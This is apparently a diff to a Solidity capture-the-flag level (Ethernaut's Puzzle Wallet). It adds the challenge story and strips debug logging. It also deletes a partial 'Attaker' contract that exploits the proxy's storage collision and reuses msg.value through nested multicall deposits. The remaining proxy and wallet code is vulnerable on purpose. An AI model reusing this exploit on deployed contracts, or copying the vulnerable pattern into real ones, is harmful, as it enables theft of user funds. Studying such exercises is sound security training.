@@ -3,6 +3,26 @@ pragma solidity ^0.8.0;
 
 import {console} from "forge-std/console.sol";
 
+// Nowadays, paying for DeFi operations is impossible, fact.
+
+// A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction,
+// so they developed a smart contract for doing this.
+
+// They needed this contract to be upgradeable in case the code contained a bug,
+// and they also wanted to prevent people from outside the group from using it.
+// To do so, they voted and assigned two people with special roles in the system:
+// The admin, which has the power of updating the logic of the smart contract.
+// The owner, which controls the whitelist of addresses allowed to use the contract.
+// The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
+
+// Little did they know, their lunch money was at risk…
+
+//   You'll need to hijack this wallet to become the admin of the proxy.
+//   Things that might help:
+
+// Understanding how delegatecall works and how msg.sender and msg.value behaves when performing one.
+// Knowing about proxy patterns and the way they handle storage variables.
+
 abstract contract UpgradeableProxy {
     // Storage slot with the address of the current implementation.
     // The keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1.
@@ -18,12 +38,10 @@ abstract contract UpgradeableProxy {
     }
 
     fallback() external payable {
-        console.log("fallback!!!!");
         _delegate(_implementation());
     }
 
     receive() external payable {
-        console.log("receive");
         _delegate(_implementation());
     }
 
@@ -48,8 +66,6 @@ abstract contract UpgradeableProxy {
     }
 
     function _delegate(address implementation) internal {
-        console.log("delegate", implementation);
-
         assembly {
             calldatacopy(0, 0, calldatasize())
 
@@ -83,7 +99,6 @@ contract PuzzleProxy is UpgradeableProxy {
     }
 
     function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
-        console.log("approveNewAdmin!!!");
         require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
         admin = pendingAdmin;
     }
@@ -96,6 +111,7 @@ contract PuzzleProxy is UpgradeableProxy {
 contract PuzzleWallet {
     address public owner; // slot0
     uint256 public maxBalance; // slot1
+
     mapping(address => bool) public whitelisted; // slot2
     mapping(address => uint256) public balances; // slot3
 
@@ -106,15 +122,11 @@ contract PuzzleWallet {
     }
 
     modifier onlyWhitelisted() {
-        console.log("onlyWhitelisted");
         require(whitelisted[msg.sender], "Not whitelisted");
         _;
     }
 
     function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
-        console.log("address(this).balance", address(this).balance);
-        console.log("maxBalance", maxBalance);
-
         require(address(this).balance == 0, "Contract balance is not 0");
         maxBalance = _maxBalance;
     }
@@ -147,67 +159,13 @@ contract PuzzleWallet {
                 selector := mload(add(_data, 32))
             }
 
-            // console.log('BOOL', selector == this.deposit.selector);
-            // console.log('BYTES_1');
-            // console.logBytes(abi.encodeWithSelector(this.deposit.selector));
-            // console.log('BYTES_2');
-            // console.logBytes(abi.encodeWithSelector(selector));
-            // console.log('BYTES_3');
-
             if (selector == this.deposit.selector) {
                 require(!depositCalled, "Deposit can only be called once");
                 // Protect against reusing msg.value
                 depositCalled = true;
             }
-            console.log("address(this)", address(this));
             (bool success,) = address(this).delegatecall(data[i]);
             require(success, "Error while delegating call");
         }
-    }
-}
-
-contract Attaker {
-    address private proxy;
-    address private owner;
-    address private wallet;
-
-    constructor(address _proxy, address _wallet) {
-        owner = msg.sender;
-        proxy = _proxy;
-        wallet = _wallet;
-    }
-
-    fallback() external payable {
-        console.log("Attaker_fallback");
-    }
-
-    receive() external payable {
-        console.log("Attaker_receive");
-    }
-
-    function attack() public {
-        require(msg.sender == owner, "Not the owner");
-
-        (bool success,) = proxy.call(abi.encodeWithSignature("proposeNewAdmin(address)", address(this)));
-        require(success, "Propose new admin failed");
-
-        (bool success1,) = proxy.call(abi.encodeWithSelector(PuzzleWallet.addToWhitelist.selector, address(this)));
-        require(success1, "Add to whitelist failed");
-
-        // (bool success2, ) = proxy.call{ value: 1e18 }(abi.encodeWithSelector(PuzzleWallet.deposit.selector));
-        // console.log('success2', success2);
-
-        bytes[] memory callData = new bytes[](5);
-        callData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-        callData[1] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-        callData[2] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-        callData[3] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-        callData[4] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-
-        (bool success2,) = proxy.call{value: 1e18}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, callData));
-        console.log("success2", success2);
-
-        // (bool success2, ) = proxy.call(abi.encodeWithSelector(PuzzleWallet.setMaxBalance.selector, address(this)));
-        // require(success2, 'Set max balance failed');
     }
 }
